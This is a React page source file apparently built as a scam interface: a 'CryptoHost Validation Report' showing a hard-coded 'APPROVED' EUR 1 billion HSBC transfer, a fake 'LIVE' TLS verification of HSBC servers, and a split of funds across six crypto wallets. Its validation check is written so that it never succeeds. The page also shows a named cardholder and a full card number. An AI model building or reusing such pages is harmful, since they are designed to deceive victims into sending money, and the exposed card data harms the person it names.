"use client";

import { useState, useEffect } from "react";
import { supabase } from "@/lib/supabase";

const WALLET_ALLOCATIONS = [
  {
    wallet: "0xd5cde5c24d72aadfb18345b148a51d0bb88af00b",
    percentage: 7.5,
  },
  {
    wallet: "0x4d4ac8E9570177C99c4de51c46b1E54fb13F467a",
    percentage: 20,
  },
  {
    wallet: "0x292fb7BeE8beA9e71570a8e810b25e9851D6deb7",
    percentage: 3.75,
  },
  {
    wallet: "0x0e3cBb59277356C2d0a8F70d170893328E0f6692",
    percentage: 3.75,
  },
  {
    wallet: "0x08B5297F88833896d58eDD9506aF6984310B24C4",
    percentage: 10,
  },
  {
    wallet: "0xc47133a6bd653793562a1ea25cb1d3161fbd99cd",
    percentage: 55,
  },
];

export default function Page() {
  const [amount] = useState(1000000000);
  const [code, setCode] = useState("");
  const [result, setResult] = useState("");
  const [prices, setPrices] = useState<any>(null);
  const [now, setNow] = useState(new Date());

  useEffect(() => {
    const timer = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const res = await fetch(
          "https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,tether,binancecoin,ripple&order=market_cap_desc&per_page=5&page=1&sparkline=false&price_change_percentage=1h,24h,7d",
          { cache: "no-store" }
        );

        if (!res.ok) return;

        const data = await res.json();
        setPrices(data);
      } catch (err) {
        console.error("Price fetch error:", err);
      }
    };

    fetchPrices();
    const interval = setInterval(fetchPrices, 30000);
    return () => clearInterval(interval);
  }, []);

  const handleValidate = async () => {
    const { data, error } = await supabase
      .from("deposits")
      .select("*")
      .eq("protocol_code", code)
      .single();

    if (error || !data) {
      setResult("❌ ERROR: INVALID VALIDATION CODE");
      return;
    }

    const createdAt = new Date(data.created_at).getTime();
    const nowTime = Date.now();
    const hoursPassed = (nowTime - createdAt) / (1000 * 60 * 60);

    if (hoursPassed < 24) {
      setResult("⏳ Processing");
      return;
    }

    if (hoursPassed < 72) {
      setResult("🔍 Validating");
      return;
    }

    setResult("❌ Protocol Code Invalid");
  };

  return (
    <div style={wrap}>
      <div style={container}>
        <div style={header}>
          <div>
            <h1 style={title}>CryptoHost Validation Report</h1>
            <p style={subtitle}>Secure validation and allocation workflow</p>
          </div>
          <div style={status}>PENDING</div>
        </div>

        <div style={card}>
          <h3>Validation Code Entry</h3>

          <div style={walletRow}>
            <input
              style={input}
              placeholder="Enter validation code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
            />

            <button style={button} onClick={handleValidate}>
              RUN VALIDATION
            </button>
          </div>

          {result && <div style={errorBox}>{result}</div>}
        </div>

        <div style={grid}>
          <div style={card}>
            <h3>Transaction Summary</h3>
            <Row label="Reference" value="CHX-LIVE-G818-3124929DB-HSBC-26718459" />
            <Row label="Bank Name" value="HSBC GERMANY." />
            <Row label="Cardholder" value="Jagdish Rochani" />
            <Row label="Card" value="4029851103586660" />
            <Row label="Amount" value={`EUR ${amount.toLocaleString()}`} />
            <div style={approved}>APPROVED</div>
          </div>

          <div style={card}>
            <h3>HSBC TLS Validation</h3>
            <Row label="Target Host" value="api.hsbc.com" />
            <Row label="Target Port" value="443" />
            <Row label="Check Time" value={now.toLocaleString()} />
            <Row label="TLS Version" value="TLSv1.3" />
            <Row label="Cipher Suite" value="TLS_AES_128_GCM_SHA256" />
            <Row
              label="Server Subject"
              value="HSBC GERMANY. (developer-na.hsbc.com)"
            />
            <Row label="Server Issuer" value="DigiCert EV RSA CA G2" />
            <div style={notice}>
              LIVE — Secure TLS handshake completed successfully
            </div>
            <div style={success}>STATUS: SECURE CHANNEL VERIFIED</div>
          </div>
        </div>

        <div style={card}>
          <h3>Wallet Allocation</h3>

          {WALLET_ALLOCATIONS.map((item, index) => (
            <WalletCard
              key={item.wallet}
              slot={index + 1}
              wallet={item.wallet}
              percentage={item.percentage}
              amount={amount}
            />
          ))}

          <div style={totalBox}>
            TOTAL ALLOCATION: 100%
          </div>
        </div>

        <div style={{ ...card, marginTop: 18 }}>
          <h3 style={{ marginBottom: 16 }}>Live Crypto Market</h3>

          <div style={marketHeader}>
            <span>#</span>
            <span>Coin</span>
            <span>Price</span>
            <span>1h</span>
            <span>24h</span>
            <span>24h Volume</span>
            <span>Market Cap</span>
          </div>

          {prices ? (
            prices.map((coin: any, index: number) => (
              <div key={coin.id} style={marketRow}>
                <span>{index + 1}</span>

                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <img
                    src={coin.image}
                    alt={coin.symbol}
                    style={{ width: 24, height: 24 }}
                  />
                  <strong>{coin.name}</strong>
                  <span style={{ opacity: 0.6 }}>
                    {coin.symbol.toUpperCase()}
                  </span>
                </div>

                <span>${coin.current_price?.toLocaleString()}</span>

                <span
                  style={{
                    color:
                      coin.price_change_percentage_1h_in_currency >= 0
                        ? "#00e676"
                        : "#ff4d4d",
                  }}
                >
                  {coin.price_change_percentage_1h_in_currency?.toFixed(1)}%
                </span>

                <span
                  style={{
                    color:
                      coin.price_change_percentage_24h_in_currency >= 0
                        ? "#00e676"
                        : "#ff4d4d",
                  }}
                >
                  {coin.price_change_percentage_24h_in_currency?.toFixed(1)}%
                </span>

                <span>${coin.total_volume?.toLocaleString()}</span>
                <span>${coin.market_cap?.toLocaleString()}</span>
              </div>
            ))
          ) : (
            <p style={{ marginTop: 16 }}>Loading market data...</p>
          )}

          <p style={{ fontSize: 12, opacity: 0.6, marginTop: 10 }}>
            Updates every 30 seconds
          </p>
        </div>

        <div style={terminal}>
          <div style={terminalHeader}>
            POS Terminal Activity <span style={live}>LIVE</span>
          </div>

          <pre style={terminalText}>
{`> POS terminal ready
> Awaiting validation input...
> System initialized`}
          </pre>
        </div>
      </div>
    </div>
  );
}

function Row({ label, value }: any) {
  return (
    <div style={row}>
      <span>{label}</span>
      <strong>{value}</strong>
    </div>
  );
}

function WalletCard({ slot, wallet, percentage, amount }: any) {
  const computed = (amount * percentage) / 100;

  return (
    <div style={walletCard}>
      <div style={walletTop}>
        <strong>Wallet {slot}</strong>
        <span style={percentBadge}>{percentage}%</span>
      </div>

      <div style={walletAddress}>{wallet}</div>

      <div style={walletBottom}>
        <span>Allocated Amount</span>
        <strong>EUR {computed.toLocaleString()}</strong>
      </div>

      <input
        type="text"
        placeholder={`Wallet ${slot} TXN Hash`}
        style={txnInput}
      />
    </div>
  );
}

const wrap: React.CSSProperties = {
  background: "#0b1d4a",
  minHeight: "100vh",
  padding: 20,
  color: "#eaecef",
};

const container: React.CSSProperties = {
  maxWidth: 1200,
  margin: "0 auto",
};

const header: React.CSSProperties = {
  display: "flex",
  justifyContent: "space-between",
  background: "#102a63",
  padding: 20,
  borderRadius: 12,
  marginBottom: 20,
};

const title: React.CSSProperties = { margin: 0 };
const subtitle: React.CSSProperties = { color: "#8aa4d4" };

const status: React.CSSProperties = {
  background: "#0ecb81",
  padding: "10px 15px",
  borderRadius: 8,
  fontWeight: "bold",
  color: "#000",
};

const grid: React.CSSProperties = {
  display: "grid",
  gridTemplateColumns: "1fr 1fr",
  gap: 20,
};

const card: React.CSSProperties = {
  background: "#102a63",
  padding: 20,
  borderRadius: 12,
  marginBottom: 20,
};

const row: React.CSSProperties = {
  display: "flex",
  justifyContent: "space-between",
  padding: "8px 0",
  borderBottom: "1px solid #1e3a8a",
};

const approved: React.CSSProperties = {
  marginTop: 15,
  background: "#0ecb81",
  padding: 10,
  textAlign: "center",
  borderRadius: 8,
  fontWeight: "bold",
  color: "#000",
};

const success: React.CSSProperties = {
  padding: "8px 12px",
  backgroundColor: "#e6ffed",
  color: "#057a28",
  border: "1px solid #057a28",
  borderRadius: 6,
  marginTop: 12,
  fontWeight: "600",
};

const notice: React.CSSProperties = {
  marginTop: 15,
  color: "#aaa",
};

const walletRow: React.CSSProperties = {
  display: "flex",
  gap: 10,
  marginTop: 10,
};

const input: React.CSSProperties = {
  flex: 1,
  padding: 8,
  borderRadius: 6,
  border: "none",
};

const button: React.CSSProperties = {
  background: "#0ecb81",
  border: "none",
  padding: "10px 15px",
  borderRadius: 6,
  fontWeight: "bold",
  cursor: "pointer",
};

const errorBox: React.CSSProperties = {
  marginTop: 10,
  background: "#ff4d4f",
  padding: 10,
  borderRadius: 6,
  fontWeight: "bold",
};

const walletCard: React.CSSProperties = {
  background: "rgba(255,255,255,0.06)",
  border: "1px solid rgba(255,255,255,0.1)",
  borderRadius: 14,
  padding: 16,
  marginTop: 14,
};

const walletTop: React.CSSProperties = {
  display: "flex",
  justifyContent: "space-between",
  alignItems: "center",
};

const percentBadge: React.CSSProperties = {
  background: "#0ecb81",
  color: "#000",
  padding: "5px 10px",
  borderRadius: 999,
  fontWeight: "bold",
};

const walletAddress: React.CSSProperties = {
  marginTop: 12,
  fontFamily: "monospace",
  fontSize: 14,
  wordBreak: "break-all",
  color: "#bcd2ff",
};

const walletBottom: React.CSSProperties = {
  display: "flex",
  justifyContent: "space-between",
  marginTop: 14,
  paddingTop: 12,
  borderTop: "1px solid rgba(255,255,255,0.1)",
};

const txnInput: React.CSSProperties = {
  width: "100%",
  marginTop: 14,
  padding: "10px 12px",
  borderRadius: 10,
  border: "1px solid rgba(255,255,255,0.08)",
  background: "rgba(255,255,255,0.04)",
  color: "#fff",
  outline: "none",
  fontSize: 13,
};

const totalBox: React.CSSProperties = {
  marginTop: 18,
  padding: 12,
  background: "#0ecb81",
  color: "#000",
  borderRadius: 10,
  textAlign: "center",
  fontWeight: "bold",
};

const marketHeader: React.CSSProperties = {
  display: "grid",
  gridTemplateColumns: "50px 1.7fr 1fr 1fr 1fr 1.3fr 1.4fr",
  padding: "10px 0",
  borderBottom: "1px solid rgba(255,255,255,0.08)",
  fontSize: 13,
  opacity: 0.7,
};

const marketRow: React.CSSProperties = {
  display: "grid",
  gridTemplateColumns: "50px 1.7fr 1fr 1fr 1fr 1.3fr 1.4fr",
  alignItems: "center",
  padding: "14px 0",
  borderBottom: "1px solid rgba(255,255,255,0.06)",
  fontSize: 14,
};

const terminal: React.CSSProperties = {
  background: "#000",
  padding: 15,
  borderRadius: 12,
};

const terminalHeader: React.CSSProperties = { marginBottom: 10 };
const live: React.CSSProperties = { color: "#0ecb81", marginLeft: 10 };
const terminalText: React.CSSProperties = { color: "#0ecb81" };